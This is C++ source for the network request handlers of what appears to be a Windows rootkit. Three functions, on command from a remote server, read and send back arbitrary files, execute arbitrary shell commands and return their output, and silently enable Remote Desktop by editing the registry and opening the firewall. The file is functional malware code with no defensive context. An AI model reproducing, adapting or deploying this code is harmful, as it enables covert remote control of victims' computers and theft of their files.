#include "requests.h"
#define STATUS_SUCCESS 0
BOOL RDPActivated = FALSE;


int RegularRequests::DownloadFileRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* FilePath, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	NTSTATUS GetFileStatus = STATUS_UNSUCCESSFUL;
	ROOTKIT_STATUS RkGetFileStatus = ROOTKSTATUS_OTHER;
	ROOTKIT_UNEXERR RkUnexpected = successful;
	DWORD FileRead = 0;


	// Get main structure with parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	

	// Get handle to file, get the file size and read file data:
	switch (FileOperation(FilePath, (HANDLE*)(&RootkInst->Reserved), &RootkInst->Out, &RootkInst->Size, FALSE)) {
	case -1:
		GetFileStatus = STATUS_INVALID_PARAMETER;
		RkGetFileStatus = ROOTKSTATUS_INVARGS;
		RkUnexpected = invalidargs;
		goto SendError;

	case 1:
		GetFileStatus = STATUS_INVALID_HANDLE;
		RkGetFileStatus = ROOTKSTATUS_INVARGS;
		RkUnexpected = invalidargs;
		goto SendError;

	case 2:
		GetFileStatus = STATUS_INVALID_HANDLE;
		RkGetFileStatus = ROOTKSTATUS_OTHER;
		RkUnexpected = invalidargs;
		goto SendError;

	case 3:
		GetFileStatus = STATUS_NO_MEMORY;
		RkGetFileStatus = ROOTKSTATUS_MEMALLOC;
		RkUnexpected = memalloc;
		goto SendError;

	case 4:
		GetFileStatus = STATUS_UNSUCCESSFUL;
		RkGetFileStatus = ROOTKSTATUS_LESSTHNREQ;
		RkUnexpected = successful;
		goto SendError;
	
	default:
		goto FileSuccess;
	}


	// Send the struct with the results and the file info buffer afterwards:
	FileSuccess:
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != RootkInst->Size) {
		return 0;
	}
	CloseHandle((HANDLE)RootkInst->Reserved);
	free(RootkInst->Out);
	return 1;

	SendError:
	if ((HANDLE)RootkInst->Reserved != INVALID_HANDLE_VALUE) {
		CloseHandle((HANDLE)RootkInst->Reserved);
	}
	if (RootkInst->Out != NULL) {
		free(RootkInst->Out);
	}
	RootkInst->Status = GetFileStatus;
	RootkInst->StatusCode = RkGetFileStatus;
	RootkInst->Unexpected = RkUnexpected;
	RootkInst->Size = 0;
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
	return 0;
}


int RegularRequests::RemoteCommandRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* NakedCommand, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	NTSTATUS GetFileStatus = STATUS_UNSUCCESSFUL;
	ROOTKIT_STATUS RkGetFileStatus = ROOTKSTATUS_OTHER;
	ROOTKIT_UNEXERR RkUnexpected = successful;
	DWORD FileRead = 0;
	char CommandToRun[1024] = { 0 };


	// Get main structure with parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Execute command and save output in file:
	strcat_s(CommandToRun, NakedCommand);
	strcat_s(CommandToRun, " > CommandOutput.txt");
	if (system(CommandToRun) == -1) {
		RootkInst->Status = STATUS_UNSUCCESSFUL;
		RootkInst->StatusCode = ROOTKSTATUS_OTHER;
		RootkInst->Unexpected = successful;
		RootkInst->Size = 0;
		goto SendError;
	}
	
	
	// Get handle to file, get the file size and read file data:
	switch (FileOperation((char*)"CommandOutput.txt", (HANDLE*)(&RootkInst->Reserved), &RootkInst->Out, &RootkInst->Size, FALSE)) {
	case -1:
		GetFileStatus = STATUS_INVALID_PARAMETER;
		RkGetFileStatus = ROOTKSTATUS_INVARGS;
		RkUnexpected = invalidargs;
		goto SendError;

	case 1:
		GetFileStatus = STATUS_INVALID_HANDLE;
		RkGetFileStatus = ROOTKSTATUS_INVARGS;
		RkUnexpected = invalidargs;
		goto SendError;

	case 2:
		GetFileStatus = STATUS_INVALID_HANDLE;
		RkGetFileStatus = ROOTKSTATUS_OTHER;
		RkUnexpected = invalidargs;
		goto SendError;

	case 3:
		GetFileStatus = STATUS_NO_MEMORY;
		RkGetFileStatus = ROOTKSTATUS_MEMALLOC;
		RkUnexpected = memalloc;
		goto SendError;

	case 4:
		GetFileStatus = STATUS_UNSUCCESSFUL;
		RkGetFileStatus = ROOTKSTATUS_LESSTHNREQ;
		RkUnexpected = successful;
		goto SendError;

	default:
		goto FileSuccess;
	}


	// Send the struct with the results and the file info buffer afterwards:
	FileSuccess:
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		free(RootkInst->Out);
		return 0;
	}
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != RootkInst->Size) {
		free(RootkInst->Out);
		return 0;
	}
	free(RootkInst->Out);
	return 1;

SendError:
	if (RootkInst->Out != NULL) {
		free(RootkInst->Out);
	}
	RootkInst->Status = GetFileStatus;
	RootkInst->StatusCode = RkGetFileStatus;
	RootkInst->Unexpected = RkUnexpected;
	RootkInst->Size = 0;
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
	return 0;
}


int RegularRequests::ActivateRDPRequest(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	NTSTATUS GetFileStatus = STATUS_UNSUCCESSFUL;
	ROOTKIT_STATUS RkGetFileStatus = ROOTKSTATUS_OTHER;
	ROOTKIT_UNEXERR RkUnexpected = successful;
	DWORD FileRead = 0;
	char CommandToRun[1024] = { 0 };


	// Get main structure with parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Activate RDP:
	if (!RDPActivated) {
		if (system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f") == -1 ||
			system("netsh advfirewall firewall set rule group = \"remote desktop\" new enable = Yes") == -1) {
			RootkInst->Status = STATUS_UNSUCCESSFUL;
			RootkInst->StatusCode = ROOTKSTATUS_OTHER;
			RootkInst->Unexpected = successful;
			SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
			return 0;
		}
		RDPActivated = TRUE;
	}


	// Send the struct with the results and the file info buffer afterwards:
	RootkInst->Status = STATUS_SUCCESS;
	RootkInst->StatusCode = ROOTKSTATUS_SUCCESS;
	RootkInst->Unexpected = successful;
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	return 1;
}